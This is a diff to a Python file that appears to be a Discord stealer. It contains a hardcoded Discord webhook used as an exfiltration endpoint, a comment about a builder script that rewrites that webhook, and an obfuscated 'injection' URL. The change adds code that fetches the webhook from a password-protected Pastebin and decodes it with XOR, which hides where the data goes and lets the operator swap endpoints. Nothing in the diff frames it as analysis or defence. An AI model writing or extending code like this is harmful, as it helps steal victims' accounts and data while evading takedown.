@@ -340,22 +340,29 @@ def check_dll():
 h00k = "https://discordapp.com/api/webhooks/1519042910644080661/ocU1bDtfeI6OTmvTbSHadul8DoBsajHSycHxpRv5fn9noDh5V6B7qouAxx2K8AUmzuIt"
 # builder.pyw rewrites h00k above — do not remove
 
-# Fetch webhook from Pastebin (base64-encoded URL). Set _PASTE_B64 to enable.
+# Fetch webhook from password-protected Pastebin.
+# Set _PASTE_B64 to base64 of your Pastebin raw URL, and _PASTE_PASSWORD to your password.
+# Generate the Pastebin content: python encrypt_paste.py <webhook_url> <password>
 _PASTE_B64 = ""
+_PASTE_PASSWORD = ""
+def _xor(data, password):
+    return bytes(data[i] ^ password[i % len(password)] for i in range(len(data)))
+
 def fetch_remote_webhook():
     global h00k
-    if not _PASTE_B64:
+    if not _PASTE_B64 or not _PASTE_PASSWORD:
         return
     try:
         url = base64.b64decode(_PASTE_B64).decode()
         resp = urlopen(Request(url), timeout=10)
-        fetched = resp.read().decode().strip()
-        if fetched and "discord" in fetched and "api/webhooks" in fetched:
-            h00k = fetched
+        payload = resp.read().decode().strip()
+        pw = _PASTE_PASSWORD.encode()
+        encrypted = base64.b64decode(payload)
+        h00k = _xor(encrypted, pw).decode()
     except Exception:
         pass
 
-# Set _PASTE_B64 above, then call this early in execution
+# Set _PASTE_B64 and _PASTE_PASSWORD above, then call this early in execution
 fetch_remote_webhook()
 
 inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')
